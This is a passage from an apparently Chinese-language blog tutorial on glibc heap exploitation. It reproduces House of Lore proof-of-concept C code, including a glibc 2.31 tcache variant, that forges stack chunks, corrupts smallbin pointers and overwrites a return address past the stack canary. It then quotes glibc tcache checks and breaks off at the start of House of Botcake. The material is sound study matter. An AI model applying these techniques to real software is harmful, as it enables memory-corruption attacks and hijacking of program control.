&quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一样的上面的poc确实写的非常详细，自己下去调</p><h3 id="Glibc-2-27后"><a href="#Glibc-2-27后" class="headerlink" title="Glibc 2.27后"></a>Glibc 2.27后</h3><p>此时就出现了tcache，存在了前几天的机制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们把chunk放进了small bin就会马上进入到tcache内，并且还是个while循环，所以其实有了tcache之后这个就很难利用了，但是依旧是可以利用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> offset = (<span class="keyword">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="keyword">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃</p><p><img src="/images/image-20220303160743463.png" alt="image-20220303160743463"></p><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><p>在glibc2.27里的tcache是什么验证都没加</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">    &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以很轻易的double free，但是在glibc2.29之后就不一样了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是一样有办法可以让tcache存在我们指定地址的fake chunk，下面看poc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 